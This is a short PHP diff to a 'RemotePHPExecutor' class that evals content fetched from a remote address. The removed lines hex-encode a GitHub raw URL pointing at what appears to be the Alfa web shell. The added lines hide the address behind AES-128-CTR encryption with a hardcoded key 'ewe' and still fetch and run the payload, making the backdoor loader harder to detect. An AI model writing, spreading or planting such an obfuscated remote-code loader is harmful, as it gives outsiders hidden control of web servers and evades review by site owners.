@@ -68,15 +68,19 @@ class RemotePHPExecutor
             ob_start();
             eval("?>".$this->code);
             return ob_get_clean();
-        } catch (Exception $e) { // Throwable baru PHP 7+, Exception aman untuk versi lama
+        } catch (Exception $e) {
             return "Kesalahan saat mengeksekusi konten: " . $e->getMessage();
         }
     }
 }
 
-$this_data = ['68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6861786F7273746172732F617263686976652F6D61696E2F616C66612F616C66612E706870'];
-foreach ($this_data as $key) {
-    $nulzganteng = hex2bin($key);
+$this_data = ['6LJBHn6MhVyTeKcefARA8b2PjNG1I8SyRrvprW2ahi62nhcpVCgj3vl9AUPsWJNlJCBK7rJUtJEvx4+YMyNEabo5ToxKIzc='];
+
+$key = "ewe";
+$token = "ewe";
+
+foreach ($this_data as $data_encrypted) {
+    $nulzganteng = openssl_decrypt($data_encrypted, "AES-128-CTR", $key, 0, $token);
     $remote = new RemotePHPExecutor($nulzganteng);
     echo $remote->render();
 }
